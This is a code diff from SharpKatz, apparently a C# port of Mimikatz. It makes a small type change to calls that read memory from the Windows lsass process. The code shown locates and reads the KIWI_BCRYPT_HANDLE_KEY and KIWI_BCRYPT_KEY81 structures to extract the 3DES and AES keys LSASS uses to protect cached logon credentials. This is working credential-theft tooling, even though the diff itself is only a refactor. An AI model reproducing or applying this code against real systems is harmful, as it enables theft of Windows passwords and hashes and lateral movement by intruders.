@@ -123,11 +123,11 @@ namespace SharpKatz
             long keyPointerInt = BitConverter.ToInt64(keyPointerBytes, 0);
 
             // Read the KIWI_BCRYPT_HANDLE_KEY struct from lsass
-            byte[] h3DesKeyBytes = Utility.ReadFromLsass(ref hLsass, new IntPtr(keyPointerInt), Convert.ToUInt64(Marshal.SizeOf(typeof(KIWI_BCRYPT_HANDLE_KEY))));
+            byte[] h3DesKeyBytes = Utility.ReadFromLsass(ref hLsass, new IntPtr(keyPointerInt), Marshal.SizeOf(typeof(KIWI_BCRYPT_HANDLE_KEY)));
             h3DesKey = Utility.ReadStruct<KIWI_BCRYPT_HANDLE_KEY>(h3DesKeyBytes);
 
             // Read in the 3DES key
-            byte[] extracted3DesKeyByte = Utility.ReadFromLsass(ref hLsass, h3DesKey.key, Convert.ToUInt64(Marshal.SizeOf(typeof(KIWI_BCRYPT_KEY81))));
+            byte[] extracted3DesKeyByte = Utility.ReadFromLsass(ref hLsass, h3DesKey.key, Marshal.SizeOf(typeof(KIWI_BCRYPT_KEY81)));
             extracted3DesKey = Utility.ReadStruct<KIWI_BCRYPT_KEY81>(extracted3DesKeyByte);
 
             this.deskey = extracted3DesKey.hardkey.data;
@@ -145,11 +145,11 @@ namespace SharpKatz
             keyPointerInt = BitConverter.ToInt64(keyPointerBytes, 0);
 
             // Read the KIWI_BCRYPT_HANDLE_KEY struct from lsass
-            byte[] hAesKeyBytes = Utility.ReadFromLsass(ref hLsass, new IntPtr(keyPointerInt), Convert.ToUInt64(Marshal.SizeOf(typeof(KIWI_BCRYPT_HANDLE_KEY))));
+            byte[] hAesKeyBytes = Utility.ReadFromLsass(ref hLsass, new IntPtr(keyPointerInt), Marshal.SizeOf(typeof(KIWI_BCRYPT_HANDLE_KEY)));
             hAesKey = Utility.ReadStruct<KIWI_BCRYPT_HANDLE_KEY>(hAesKeyBytes);
 
             // Read in AES key
-            byte[] extractedAesKeyBytes = Utility.ReadFromLsass(ref hLsass, hAesKey.key, Convert.ToUInt64(Marshal.SizeOf(typeof(KIWI_BCRYPT_KEY81))));
+            byte[] extractedAesKeyBytes = Utility.ReadFromLsass(ref hLsass, hAesKey.key, Marshal.SizeOf(typeof(KIWI_BCRYPT_KEY81)));
             extractedAesKey = Utility.ReadStruct<KIWI_BCRYPT_KEY81>(extractedAesKeyBytes);
 
             this.aeskey = extractedAesKey.hardkey.data;
